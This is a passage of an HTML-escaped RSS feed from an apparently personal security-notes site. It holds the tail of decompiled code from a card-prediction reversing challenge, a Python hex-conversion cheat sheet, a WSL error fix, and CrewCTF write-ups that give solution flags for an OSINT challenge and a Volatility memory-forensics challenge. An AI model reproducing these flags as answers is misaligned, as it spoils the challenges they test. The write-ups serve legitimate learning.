&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">129&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;7&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v17 &lt;span style="color:#f92672">=&lt;/span> v16 &lt;span style="color:#f92672">+&lt;/span> v15;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v18 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">64&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;C&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v19 &lt;span style="color:#f92672">=&lt;/span> v18 &lt;span style="color:#f92672">+&lt;/span> v17;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v20 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">96&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v21 &lt;span style="color:#f92672">=&lt;/span> v20 &lt;span style="color:#f92672">+&lt;/span> v19;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">192&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v23 &lt;span style="color:#f92672">=&lt;/span> v22 &lt;span style="color:#f92672">+&lt;/span> v21;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">65&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;8&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> v24 &lt;span style="color:#f92672">+&lt;/span> v23;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v26 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">97&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;5&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v27 &lt;span style="color:#f92672">=&lt;/span> v26 &lt;span style="color:#f92672">+&lt;/span> v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v28 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">160&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v29 &lt;span style="color:#f92672">=&lt;/span> v28 &lt;span style="color:#f92672">+&lt;/span> v27;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">128&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v31 &lt;span style="color:#f92672">=&lt;/span> v30 &lt;span style="color:#f92672">+&lt;/span> v29;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v32 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">161&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> v32 &lt;span style="color:#f92672">+&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v34 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">193&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v35 &lt;span style="color:#f92672">=&lt;/span> v34 &lt;span style="color:#f92672">+&lt;/span> v33;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">225&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v44 &lt;span style="color:#f92672">=&lt;/span> v35 &lt;span style="color:#f92672">+&lt;/span> v36;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">+=&lt;/span> v35 &lt;span style="color:#f92672">+&lt;/span> v36;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">--&lt;/span>v47;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v47 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Stage 2: Predict the final card I draw.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fgets(flag, &lt;span style="color:#ae81ff">32LL&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)isACard((&lt;span style="color:#66d9ef">__int64&lt;/span>)flag)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)j_strlen_ifunc(flag) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> flag[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> flag[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;Congrats! Here is your flag: &amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">32&lt;/span>, v38, v39, v40, v41, flag[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> readFlag();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You failed.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You failed.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Command Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/others/command-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/command-cheat-sheet/</guid><description>&lt;h1 id="command-cheat-sheet">
 Command Cheat Sheet
 &lt;a class="anchor" href="#command-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="python-基本用語">
 Python 基本用語
 &lt;a class="anchor" href="#python-%e5%9f%ba%e6%9c%ac%e7%94%a8%e8%aa%9e">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Bytes $\to$ Hex&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> example_str &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x17\x10\x06&lt;/span>&lt;span style="color:#e6db74">Ar&lt;/span>&lt;span style="color:#ae81ff">\xe4&lt;/span>&lt;span style="color:#e6db74">G&lt;/span>&lt;span style="color:#ae81ff">\xc9\xb5\xd7&lt;/span>&lt;span style="color:#e6db74">y&lt;/span>&lt;span style="color:#ae81ff">\xbc&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> example_str&lt;span style="color:#f92672">.&lt;/span>hex()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;1710064172e447c9b5d779bc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Hex $\to$ String&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> bytes&lt;span style="color:#f92672">.&lt;/span>fromhex(&lt;span style="color:#e6db74">&amp;#39;68656c6c6f&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;hello&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#75715e"># or&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#f92672">import&lt;/span> binascii
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> binascii&lt;span style="color:#f92672">.&lt;/span>unhexlify(&lt;span style="color:#e6db74">&amp;#39;68656c6c6f&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;hello&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#75715e"># or&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#f92672">import&lt;/span> codecs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> decode_hex &lt;span style="color:#f92672">=&lt;/span> codecs&lt;span style="color:#f92672">.&lt;/span>getdecoder(&lt;span style="color:#e6db74">&amp;#34;hex_codec&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> decode_hex(s)[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;hello&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>String $\to$ Hex&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> str&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;linuxhint&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>encode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> str&lt;span style="color:#f92672">.&lt;/span>hex()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;6c696e757868696e74&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Hex(String Type) $\to$ Decimal&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;123456&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> int(a, &lt;span style="color:#ae81ff">16&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1193046&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Decimal $\to$ Hex&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1234&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> hex(a)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;0x4d2&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Hex $\to$ Binary&lt;/p></description></item><item><title>CreateProcessEntryCommon:586: Create process not expected to return</title><link>https://bernie6401.github.io/docs/problem-solutions/createprocessentrycommon_586_-create-process-not-expected-to-return/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/createprocessentrycommon_586_-create-process-not-expected-to-return/</guid><description>&lt;h1 id="createprocessentrycommon586-create-process-not-expected-to-return">
 CreateProcessEntryCommon:586: Create process not expected to return
 &lt;a class="anchor" href="#createprocessentrycommon586-create-process-not-expected-to-return">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-problem-solution">
 tags: &lt;code>problem solution&lt;/code>
 &lt;a class="anchor" href="#tags-problem-solution">#&lt;/a>
&lt;/h6>
&lt;h2 id="problem">
 Problem
 &lt;a class="anchor" href="#problem">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wsl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Processing fstab with mount -a failed.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;3&amp;gt;WSL &lt;span style="color:#f92672">(&lt;/span>8&lt;span style="color:#f92672">)&lt;/span> ERROR: CreateProcessEntryCommon:370: getpwuid&lt;span style="color:#f92672">(&lt;/span>0&lt;span style="color:#f92672">)&lt;/span> failed &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;3&amp;gt;WSL &lt;span style="color:#f92672">(&lt;/span>8&lt;span style="color:#f92672">)&lt;/span> ERROR: CreateProcessEntryCommon:374: getpwuid&lt;span style="color:#f92672">(&lt;/span>0&lt;span style="color:#f92672">)&lt;/span> failed &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;3&amp;gt;WSL &lt;span style="color:#f92672">(&lt;/span>8&lt;span style="color:#f92672">)&lt;/span> ERROR: CreateProcessEntryCommon:577: execvpe /bin/sh failed &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;3&amp;gt;WSL &lt;span style="color:#f92672">(&lt;/span>8&lt;span style="color:#f92672">)&lt;/span> ERROR: CreateProcessEntryCommon:586: Create process not expected to &lt;span style="color:#66d9ef">return&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="solution">
 Solution
 &lt;a class="anchor" href="#solution">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wsl -l
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Windows 子系統 Linux 版發佈:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-desktop-data &lt;span style="color:#f92672">(&lt;/span>預設&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-desktop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Ubuntu-20.04
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ wsl -s Ubuntu-20.04
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>操作順利完成。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://askubuntu.com/questions/1423048/i-am-getting-error-on-windows-subsystem">i am getting error on windows subsystem&lt;/a>&lt;/p></description></item><item><title>CrewCTF - :-1: Questions</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/bad/crewctf---_-1_-questions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/bad/crewctf---_-1_-questions/</guid><description>&lt;h1 id="challenge-findme">
 Challenge: findme
 &lt;a class="anchor" href="#challenge-findme">#&lt;/a>
&lt;/h1>
&lt;h2 id="source">
 Source
 &lt;a class="anchor" href="#source">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler
&lt;img src="https://hackmd.io/_uploads/HkL1AbiKn.png" alt="" />
:::&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題就只是找一張照片的經緯度，不二法門就是慢慢找，真TM累&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>crew{35.6682,138.5699}&lt;/code>&lt;/p></description></item><item><title>CrewCTF - Attaaaaack 1-13</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---attaaaaack-1-13/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---attaaaaack-1-13/</guid><description>&lt;h1 id="crewctf---attaaaaack-1-13">
 CrewCTF - Attaaaaack 1-13
 &lt;a class="anchor" href="#crewctf---attaaaaack-1-13">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;p>One of our employees at the company complained about suspicious behavior on the machine, our IR team took a memory dump from the machine and we need to investigate it.&lt;/p>
&lt;h2 id="attaaaaack-1">
 ==Attaaaaack 1==
 &lt;a class="anchor" href="#attaaaaack-1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Q1. What is the best profile for the the machine?&lt;/p>&lt;/blockquote>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ volatility_2.6_win64_standalone.exe -f memdump.raw imageinfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volatility Foundation Volatility Framework 2.6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>INFO : volatility.debug : Determining profile based on KDBG search...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer1 : IA32PagedMemoryPae &lt;span style="color:#f92672">(&lt;/span>Kernel AS&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer2 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>D:&lt;span style="color:#ae81ff">\N&lt;/span>TU&lt;span style="color:#ae81ff">\C&lt;/span>TF&lt;span style="color:#ae81ff">\C&lt;/span>rewCTF&lt;span style="color:#ae81ff">\M&lt;/span>isc&lt;span style="color:#ae81ff">\A&lt;/span>ttaaaaack&lt;span style="color:#ae81ff">\m&lt;/span>emdump.raw&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PAE type : PAE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DTB : 0x185000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KDBG : 0x82b7ab78L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Number of Processors : &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image Type &lt;span style="color:#f92672">(&lt;/span>Service Pack&lt;span style="color:#f92672">)&lt;/span> : &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KPCR &lt;span style="color:#66d9ef">for&lt;/span> CPU &lt;span style="color:#ae81ff">0&lt;/span> : 0x80b96000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KUSER_SHARED_DATA : 0xffdf0000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image date and time : 2023-02-20 19:10:54 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image local date and time : 2023-02-20 21:10:54 +0200
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag: &lt;code>crew{Win7SP1x86_23418}&lt;/code>&lt;/p></description></item><item><title>CrewCTF - Encrypt10n(Part 1)</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---encrypt10npart-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---encrypt10npart-1/</guid><description>&lt;h1 id="crewctf---encrypt10npart-1">
 CrewCTF - Encrypt10n(Part 1)
 &lt;a class="anchor" href="#crewctf---encrypt10npart-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/volatilityfoundation/volatility3">Volatility 3&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: We made a memory dump on the criminal machine after entering the crime scene. Our investigator thought he was using encryption software to hide the secret. can you help me to detect it?&lt;/li>
&lt;li>Q1 : crew{password}
這種類型之前沒碰過，所以看了別人的WP學一下&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>
